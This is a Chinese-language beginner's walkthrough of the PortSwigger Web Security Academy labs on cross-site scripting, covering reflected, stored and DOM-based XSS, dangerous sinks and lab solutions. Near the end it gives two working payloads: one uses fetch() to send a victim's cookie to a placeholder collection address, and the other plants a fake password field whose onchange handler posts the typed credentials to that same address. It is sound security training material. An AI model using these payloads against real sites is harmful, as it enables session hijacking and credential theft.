> 原文链接: https://www.anquanke.com//post/id/245953 


# 梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之客户端漏洞篇 - 跨站脚本(XSS)专题


                                阅读量   
                                **47626**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p5.ssl.qhimg.com/t013e464cc1bc047ec9.jpg)](https://p5.ssl.qhimg.com/t013e464cc1bc047ec9.jpg)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 客户端漏洞篇介绍

> 相对于服务器端漏洞篇，客户端漏洞篇会更加复杂，需要在我们之前学过的服务器篇的基础上去利用。



## 客户端漏洞篇 – 跨站脚本(XSS)专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC(XSS)?"></a>什么是跨站脚本(XSS)?

XSS全称是cross-site script，burp官方的解释是允许攻击者与应用程序进行交互。攻击者可以利用XSS伪装成受害者，从而利用受害者身份执行其身份下能够执行的任何操作，包括查看其权限下任何数据，所以XSS的危害还是可大可小的，主要取决于受害者的权限大小。

# <a class="reference-link" name="XSS%E6%98%AF%E6%80%8E%E4%B9%88%E6%94%BB%E5%87%BB%E7%9A%84%EF%BC%9F"></a>XSS是怎么攻击的？

XSS就是将恶意的JS脚本投放到受害者端，当受害者端触发到投放的恶意脚本后即会执行攻击者进行构造的操作，从而达到某种恶意目的。

### <a class="reference-link" name="XSS%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A7%8D%E7%B1%BB%EF%BC%9F"></a>XSS有哪些种类？
- 反射型XSS，恶意脚本来源于HTTP请求中
- 存储型XSS，恶意脚本来源于Web数据库
- 基于DOM的XSS，仅存在于客户端的漏洞，即与服务器端无任何交互操作
### <a class="reference-link" name="%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>反射型XSS

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9F"></a>什么是反射型XSS？

反射型XSS就是应用程序接收到一个HTTP请求，然后以不安全的方式映射到响应中，例如某应用程序构造以参数值为索引的HTTP请求<br>`https://insecure-website.com/search?term=gift`<br>
然后应用程序会将参数值拼接到响应中<br>`&lt;p&gt;You searched for: gift&lt;/p&gt;`<br>
现在还属于是正常的参数值，那么如果我们将参数值设置为这个呢<br>`https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;`<br>
映射到响应中就会变成这样<br>`&lt;p&gt;You searched for: &lt;script&gt;/* Bad stuff here... */&lt;/script&gt;&lt;/p&gt;`<br>
这条响应如果被受害者打开，在经过浏览器的解析后，遇到闭合的script标签，会将其中内容按照JS脚本来解析，这就使得攻击者达到了其目的，执行了恶意的JS脚本。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81%E6%93%8D%E4%BD%9C%E7%9A%84HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：没有编码操作的HTML上下文中的反射型XSS

首先我们看到一个搜索框

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01143f3a49626a59de.png)

我们输入一个1，然后看看请求和响应是什么样子的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b3f45d4566badb20.png)

我们发现参数search的值会被映射到响应中，那么我们将其修改为XSS payload呢

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017af6c064a82629f8.png)

我们惊奇地发现参数值被完完整整地映射到响应中，没有经过任何编码处理，如果是在浏览器打开这个响应就可以看到因触发XSS执行了其中的alert函数造成的弹窗

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01312f5f3357306a71.png)

这就表明是存在XSS漏洞的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013243382022c8b0e7.png)

### <a class="reference-link" name="%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E7%9A%84%E5%BD%B1%E5%93%8D"></a>反射型XSS的影响

在了解到了反射型XSS的触发原理后，我们来介绍一下反射型XSS能干些什么
- 执行受害者权限下能执行的任何操作
- 查看受害者权限下能查看的任何数据
- 修改受害者权限下能修改的任何信息
- 以受害者身份与其他用户进行交互
攻击者只需要诱使受害者点击附有反射型XSS payload的链接即会触发

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B%E5%92%8C%E6%B5%8B%E8%AF%95%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%EF%BC%9F"></a>如何探测和测试反射型XSS漏洞？
- 测试每一个入口点
- 设置参数值为随机字母数字
- 观察参数值映射到响应中的上下文
- 测试多个payload
- 在不同浏览器中测试payload能否生效
### <a class="reference-link" name="%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E5%92%8Cself%20XSS%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"></a>反射型XSS和self XSS有什么区别？

攻击者可以通过诱使用户点击链接触发反射型XSS，但是self XSS，顾名思义，只能由受害者自己输入XSS payload才会触发，所以一般self XSS危害并不大。

### <a class="reference-link" name="%E5%AD%98%E5%82%A8%E5%9E%8BXSS"></a>存储型XSS

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%9F"></a>什么是存储型XSS？

存储型XSS就是应用程序从Web数据库获取数据后以不安全的形式映射到响应中，又称持久性XSS或二阶XSS。比如在某个提交评论的功能点提交评论，请求包是这样的

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net

```

从上面来看，我们提交了这样一条评论：This post was extremely helpful.，因为是评论，所以所有用户都是能接收到这条响应的<br>`&lt;p&gt;This post was extremely helpful.&lt;/p&gt;`<br>
那么如果我们提交一个附有XSS payload的评论呢，用户接收到的响应是这样的<br>`&lt;p&gt;&lt;script&gt;/* Bad stuff here... */&lt;/script&gt;&lt;/p&gt;`<br>
这就导致接收到的用户都会触发XSS，影响范围比反射型要广很多

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%B2%A1%E6%9C%89%E7%BC%96%E7%A0%81%E6%93%8D%E4%BD%9C%E7%9A%84HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8%E5%9E%8BXSS"></a>配套靶场：没有编码操作的HTML上下文中的存储型XSS

与上一道靶场一样，这里也是对接收的数据没有任何编码操作的，所以我们直接在评论功能点构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010d9b13732108faf1.png)

提交这条附有payload的评论以后，能看到这条评论的人都能触发

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01daf6042ab734c38c.png)

### <a class="reference-link" name="%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E7%9A%84%E5%BD%B1%E5%93%8D"></a>存储型XSS的影响

因为都是XSS，所以存储型XSS的影响与反射型相同。不同的是存储型XSS不需要像发动反射型XSS一样要诱使受害者点击链接，只需要等待受害者进入有存储XSS payload的页面即可，而且因为只要进入该页面的人都会触发，所以存储型XSS的危害范围是比较广的。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B%E5%92%8C%E6%B5%8B%E8%AF%95%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%EF%BC%9F"></a>如何探测和测试存储型XSS漏洞？

要探测存储型XSS漏洞需要测试所有的有数据存取操作的入口点，包括
- URL查询字符串和消息正文中的参数或其他数据
- URL文件路径
- 与反射 XSS 相关的可能无法利用的 HTTP 请求标头
- 任何可以向应用程序发送数据的带外路由
### <a class="reference-link" name="%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"></a>存储型XSS和反射型XSS有什么区别？

虽然两种XSS都会将接收的数据映射到响应中，但是入口点不同，存储型的入口点是数据库，反射型的入口点是HTTP请求

### <a class="reference-link" name="%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS"></a>基于DOM的XSS

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS%EF%BC%9F"></a>什么是基于DOM的XSS？

我们在这里先介绍有关基于DOM的XSS的一些概念，后面会有专题专门讲DOM相关的漏洞，DOM有一个source和sink，可以理解为DOM操作函数的入口点和出口点，基于DOM的XSS就是因为将入口点的输入传递给出口点的时候被出口点函数执行导致的XSS。常见的source就是URL了，搭配window.location对象访问操作sink触发。对于source和sink的攻击，梨子计划在后面的专题中细讲。这里仅讲解XSS相关的。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS%EF%BC%9F"></a>如何测试基于DOM的XSS？

有两种测试方法，分别为
- 测试HTML sink
- 测试JS执行 sink
### <a class="reference-link" name="%E6%B5%8B%E8%AF%95HTML%20sink"></a>测试HTML sink

测试HTML sink需要攻击者在sink处(如location.search)填充随机字母数字，然后观察其在HTML页面中的位置。然后观察其上下文，再不断调整payload以观察是否能够将内容从当前标签中脱离出来。

### <a class="reference-link" name="%E6%B5%8B%E8%AF%95JS%E6%89%A7%E8%A1%8Csink"></a>测试JS执行sink

测试JS执行sink比测试HTML sink困难一点，因为可能sink的输入不会显示在页面中，这就需要在sink出下断点进行调试，跟踪变量值的变化，可能sink的输入会赋给其他变量，剩下的操作与上面相同，依然是不断调整输入以触发XSS。

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E4%B8%8D%E5%90%8C%E7%9A%84source%E5%92%8Csink%E5%88%A9%E7%94%A8%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS"></a>通过不同的source和sink利用基于DOM的XSS

能否成功利用基于DOM的XSS还是要看source和sink是否搭配，这是一个组合的问题，后面burp也给出了他们经过测试的一些source和sink的组合。<br>
这里以document.write这个sink为例进行介绍。有的情况是我们写入sink的内容需要先闭合掉前面的元素然后再写我们的payload。<br>
而对于innerHTML这个sink，它不接收script、使用onload事件的svg，所以我们可以用使用onload或onerror事件的img或iframe代替。<br>
如果应用程序使用了js库(如jQuery)，就可以寻找一些可以更改DOM元素的函数，如jQuery中的attr()函数，例如

```
$(function()`{`
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
`}`);
```

上面可以实现更改锚点(#backLink)的属性href的值为参数returnUrl的值，所以我们可以这样构造payload<br>`?returnUrl=javascript:alert(document.domain)`<br>
如果使用的是像AngularJS这种框架，就可以在没有尖括号和事件的情况下执行JS。当HTML元素使用ng-app属性时，就会被AngularJS处理，就可以在双花括号内执行JS并且回显在HTML页面或属性中。<br>
下面我们通过5个靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E4%BD%BF%E7%94%A8location.search%20source%E5%92%8Cdocument.write%20sink%E7%9A%84DOM%20XSS"></a>配套靶场1：使用location.search source和document.write sink的DOM XSS

打开页面，f12，发现了这样的代码

[![](https://p0.ssl.qhimg.com/t010511a7be5b9ce9cd.png)](https://p0.ssl.qhimg.com/t010511a7be5b9ce9cd.png)

从图中看，query的值是从URL参数search中获取并且会不经任何处理就拼接到img标签中，这就需要先提前闭合img标签然后再跟着payload，最后的效果是这样的

[![](https://p1.ssl.qhimg.com/t0105462f64c3eb8a0a.png)](https://p1.ssl.qhimg.com/t0105462f64c3eb8a0a.png)

这样就会触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f1592135fd6e3e27.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%9C%A8select%E5%85%83%E7%B4%A0%E5%86%85%E4%BD%BF%E7%94%A8location.search%20source%E5%92%8Cdocument.write%20sink%E7%9A%84DOM%20XSS"></a>配套靶场2：在select元素内使用location.search source和document.write sink的DOM XSS

我们同样是可以看到这样一段代码

[![](https://p2.ssl.qhimg.com/t0125e25af9d149ebc5.png)](https://p2.ssl.qhimg.com/t0125e25af9d149ebc5.png)

这段代码先会获取URL参数storeId的值然后如果可以获取到值就将其套在option元素中写入到页面中，所以我们可以附加这么一个参数，并将其值设置为XSS payload<br>`&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;`<br>
经过这段代码处理后是这样的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018d1bb5112c7007b9.png)

这样就会成功触发弹窗了

[![](https://p1.ssl.qhimg.com/t011387f87989203fbb.png)](https://p1.ssl.qhimg.com/t011387f87989203fbb.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA3%EF%BC%9A%E4%BD%BF%E7%94%A8location.search%20source%E5%92%8CinnerHTML%20sink%E7%9A%84DOM%20XSS"></a>配套靶场3：使用location.search source和innerHTML sink的DOM XSS

同样的，还是看段代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017478fa80d31d311f.png)

这里是写入到innerHTML，所以script和svg都无法使用了，所以我们将payload写入URL参数search

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019b75841823410b51.png)

这样就可以成功触发XSS了

[![](https://p0.ssl.qhimg.com/t015dfd37c98bf22160.png)](https://p0.ssl.qhimg.com/t015dfd37c98bf22160.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA4%EF%BC%9A%E4%BD%BF%E7%94%A8location.search%20source%E5%92%8CjQuery%E9%94%9A%E7%82%B9%E5%B1%9E%E6%80%A7sink%E7%9A%84DOM%20XSS"></a>配套靶场4：使用location.search source和jQuery锚点属性sink的DOM XSS

我们在页面中找到了之前提到过的类似的代码

[![](https://p0.ssl.qhimg.com/t01d7b0aad991d251ed.png)](https://p0.ssl.qhimg.com/t01d7b0aad991d251ed.png)

因为修改的是href属性，所以我们可以使用JS伪协议执行XSS payload

[![](https://p3.ssl.qhimg.com/t0185ccc70658c6bb5b.png)](https://p3.ssl.qhimg.com/t0185ccc70658c6bb5b.png)

这样就又能触发XSS了

[![](https://p1.ssl.qhimg.com/t012b4de279c5bebc5a.png)](https://p1.ssl.qhimg.com/t012b4de279c5bebc5a.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA5%EF%BC%9A%E5%B8%A6%E6%9C%89HTML%E7%BC%96%E7%A0%81%E7%9A%84%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84DOM%20XSS"></a>配套靶场5：带有HTML编码的尖括号和双引号的AngularJS表达式的DOM XSS

因为应用程序会对尖括号和双引号进行HTML编码处理，所以使用这两种符号的payload都不会生效，但是因为使用的是AngularJS框架，所以我们可以利用双花括号构造payload<br>``{``{`$on.constructor('alert(1)')()`}``}``<br>
这样就又可以触发XSS了

[![](https://p5.ssl.qhimg.com/t017adf65c88f795393.png)](https://p5.ssl.qhimg.com/t017adf65c88f795393.png)

### <a class="reference-link" name="%E7%BB%93%E5%90%88%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE%E7%9A%84DOM%20XSS"></a>结合反射型和存储数据的DOM XSS

前面介绍的DOM XSS，source都是从客户端输入的，如果source是HTTP请求或者数据库呢？这就将其提升为反射型DOM XSS和存储型DOM XSS，下面我们通过两个靶场来深入理解一下

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%9E%8BDOM%20XSS"></a>配套靶场1：反射型DOM XSS

我们先随便输入点什么，然后搜索，发现代码中出现了一个一开始没见过的js文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01eb9e669fc2a903b5.png)

打开这个js文件，有点长，我们一点点来分析，首先看这一段

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013bb33ea2b37969d9.png)

这一段会发送一个搜索操作的GET请求，并且利用函数displaySearchResults展示搜索结果，下面我们再来分析一下这个函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013795c82cd79291e7.png)

我们看到这个函数会将变量searchTerm拼接到一个h1元素中，但是因为是innerText，所以肯定会有些字符被转义，我们需要一点点调试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f3487d2fe67727c3.png)

我们可以看到搜索字符串的值会被赋给searchTerm参数，我们看一下尖括号和双引号会被怎么处理

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019749d8d656713e65.png)

我们看到双引号会被转义，而尖括号不会，我们看看怎么能避免被转义

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b9df316c5cb7077a.png)

发现添加一个右斜杠就可以抵消转义，成功触发XSS

[![](https://p5.ssl.qhimg.com/t01eb50961894729af1.png)](https://p5.ssl.qhimg.com/t01eb50961894729af1.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%AD%98%E5%82%A8%E5%9E%8BDOM%20XSS"></a>配套靶场2：存储型DOM XSS

同样的，我们发现了这样一个文件

[![](https://p5.ssl.qhimg.com/t01716973a3000beab7.png)](https://p5.ssl.qhimg.com/t01716973a3000beab7.png)

然后我们打开这个文件，文件的前面部分和上面的类似，我们重点分析后面的函数

[![](https://p5.ssl.qhimg.com/t0158429ea673801648.png)](https://p5.ssl.qhimg.com/t0158429ea673801648.png)

我们看到虽然代码会对尖括号进行HTML编码，但是只进行一次这个操作，所以我们可以利用一对尖括号使用掉这个操作，保护后面的尖括号，所以我们在评论提交点这样构造payload

[![](https://p4.ssl.qhimg.com/t01bc73811c04e5937a.png)](https://p4.ssl.qhimg.com/t01bc73811c04e5937a.png)

这样我们就又能成功触发XSS了

[![](https://p2.ssl.qhimg.com/t013984ecc953a65b05.png)](https://p2.ssl.qhimg.com/t013984ecc953a65b05.png)

### <a class="reference-link" name="%E5%93%AA%E4%BA%9Bsink%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%A7%A6%E5%8F%91DOM%20XSS%E6%BC%8F%E6%B4%9E%E5%91%A2%EF%BC%9F"></a>哪些sink可以用来触发DOM XSS漏洞呢？

burp总结了一些可以用来触发DOM XSS漏洞的sink
- document.write()
- document.writeln()
- document.domain
- element.innerHTML
- element.outerHTML
- element.insertAdjacentHTML
- element.onevent
如果遇到使用jQuery的应用程序，还有一些扩展的sink
- add()
- after()
- append()
- animate()
- insertAfter()
- insertBefore()
- before()
- html()
- prepend()
- replaceAll()
- replaceWith()
- wrap()
- wrapInner()
- wrapAll()
- has()
- constructor()
- init()
- index()
- jQuery.parseHTML()
- $.parseHTML()
### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3DOM%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%9F"></a>如何缓解DOM XSS漏洞？

因为上面讲了，存在很多可以触发DOM XSS的source和sink对，那我们缓解这种漏洞的措施就是尽量阻止任何不受信任的source和sink操作。

### <a class="reference-link" name="XSS%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"></a>XSS可以用来做什么？
- 冒用受害者身份
- 执行受害者能够执行的任何操作
- 访问受害者能访问的任何数据
- 窃取用户登录凭证
- 篡改网页内容
- 向网页挂马
### <a class="reference-link" name="XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"></a>XSS漏洞的利用

### <a class="reference-link" name="%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96cookie"></a>利用XSS窃取cookie

有些应用程序仅使用cookie进行会话处理，所以我们可以利用XSS窃取受害者的cookie然后将其发到指定的地址，然后可以通过替换cookie的方式伪装成受害者进行操作，但是这种利用手段还是存在一些失败的可能性的
- 受害者可能并未登录
- 有些应用程序通过HttpOnly标志对JS隐藏cookie
- 有些应用程序可能将会话与某些唯一标识信息(如IP)绑定
- 会话可能已过期
### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96cookie"></a>配套靶场：利用XSS窃取cookie

我们先在burp collaborator复制一个临时的接收地址

[![](https://p3.ssl.qhimg.com/t01fc98bb57f7e5213b.png)](https://p3.ssl.qhimg.com/t01fc98bb57f7e5213b.png)

然后我们在评论点构造payload，使用fetch函数发出POST请求，设置请求主体为当前用户的cookie，然后发送到临时的接收地址

[![](https://p2.ssl.qhimg.com/t01546acf4f837ca021.png)](https://p2.ssl.qhimg.com/t01546acf4f837ca021.png)

```
&lt;script&gt;
    fetch(
        '[临时的接收地址]',`{`
            methoed:'POST',
            mode:'no-cors',
            body:document.cookie
        `}`
    );
&lt;/script&gt;
```

接着我们看一下接收端

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ee62a6ecf9464de7.png)

看到我们成功窃取到cookie，就可以替换现有的cookie伪装成受害者登录了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0185d7ce49cd3bd84d.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96%E5%AF%86%E7%A0%81"></a>利用XSS窃取密码

很多浏览器都会有自动填写功能，我们可以利用这个特点窃取用户密码，下面我们直接通过一道靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96%E5%AF%86%E7%A0%81"></a>配套靶场：利用XSS窃取密码

因为要监控输入框的变化，所以我们引入了onchange事件，于是我们这样构造paylaod

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017c558acf42e7f78b.png)

```
&lt;input name=username id=username&gt;
&lt;input type=password name=password
    onchange="
        if(this.value.length)
            fetch('[临时的接收地址]',`{`
                method:'POST',
                mode:'no-cors',
                body:username.value+':'+this.value
                `}`
            );
    "
&gt;
```

然后我们查看一下接收端

[![](https://p4.ssl.qhimg.com/t016a7a1ebbe5e64ae2.png)](https://p4.ssl.qhimg.com/t016a7a1ebbe5e64ae2.png)

看到我们成功地获取到了用户名和密码，就可以直接登录受害者用户，成功率会比窃取cookie高一些

[![](https://p0.ssl.qhimg.com/t017e4ca24ac6332e51.png)](https://p0.ssl.qhimg.com/t017e4ca24ac6332e51.png)

